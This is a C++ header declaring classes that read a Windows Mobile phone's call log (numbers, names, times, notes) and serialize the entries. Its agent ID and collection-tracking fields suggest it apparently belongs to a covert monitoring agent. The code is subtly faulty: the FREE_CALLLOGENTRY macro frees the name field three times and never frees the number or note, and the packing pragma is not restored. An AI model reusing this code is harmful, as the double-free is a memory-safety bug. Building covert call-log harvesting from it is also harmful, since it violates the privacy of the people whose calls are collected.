#pragma once
#include <phone.h>
#include "Log.h"
#include "Common.h"

#pragma pack(4)
typedef struct _CallStruct{
	UINT	cbSize;			// sizeof CALLLOGENTRY
	DWORD	dwVersion;

	FILETIME ftStartTime;
	FILETIME ftEndTime;

	DWORD	dwProperties;

	UINT  uNumberSize;
	PTSTR pszNumber;

	UINT  uNameSize;
	PTSTR pszName;

	UINT  uNameTypeSize;
	PTSTR pszNameType;		// "w" for work tel, "h" for home tel, for example

	UINT uNoteSize;
	PTSTR pszNote;			// filename of associated Notes file
}CallStruct, *pCallStruct;
#pragma pack(1)

#define CLEAN_CALLSTRUCT(x)					\
	ZeroMemory(&x, sizeof(CallStruct));		\
	x.cbSize = sizeof(CallStruct);

#define SAFE_LOCAL_FREE(x)	\
	if (x != NULL)		\
	LocalFree(x);

#define FREE_CALLSTRUCT(x)				\
			SAFE_DELETE(x.pszName)		\
			SAFE_DELETE(x.pszNameType)	\
			SAFE_DELETE(x.pszNote)		\
			SAFE_DELETE(x.pszNumber)

#define FREE_CALLLOGENTRY(x)		\
	SAFE_LOCAL_FREE(x.pszName)		\
	SAFE_LOCAL_FREE(x.pszNameType)	\
	SAFE_LOCAL_FREE(x.pszName)		\
	SAFE_LOCAL_FREE(x.pszName)		

enum CalllistStringType{
	CALLLIST_TYPE_MASK			= 0x00FFFFFF,
	CALLLIST_STRING_NAME		= 0x01000000,
	CALLLIST_STRING_NAMETYPE	= 0x02000000,
	CALLLIST_STRING_NOTE		= 0x04000000,
	CALLLIST_STRING_NUMBER		= 0x08000000
};

#define CALLLIST_HEADER_LEN	0x1c

// Forward declaration
class CallListSerializer;

// Class Calllist
class CallListBrowser
{
private:
	DWORD		m_dwEntries;
	FILETIME	m_ft;
	HANDLE		m_hPhoneCallLog;
	UINT		m_uAgentId;

	Log callListLog, callListMarkup;

	CallListSerializer* Serializer;

	DWORD	getEntriesNumber(void);
	void	RetrieveCallList(void);
	void	ReadMarkupPosition(void);
	void	WriteMarkupPosition(void);
	BOOL	FillCallEntryStruct(CALLLOGENTRY* TmpCALLLOGENTRY, CallStruct* pTmpCallStruct, UINT* uLen);

public:
	CallListBrowser(void);
	~CallListBrowser(void);

	void	Run(UINT uAgentId);
};

// Class CallListSerializer 
class CallListSerializer
{
private:
	DWORD _Prefix(DWORD dwLength, int entryType);
	DWORD _SerializeString(LPBYTE lpDest, LPTSTR lpString, int entryType);

public:
	CallListSerializer(void){}
	~CallListSerializer(void){}

	void Serialize( CallStruct* TmpCallStruct, PBYTE  &pBuf);

};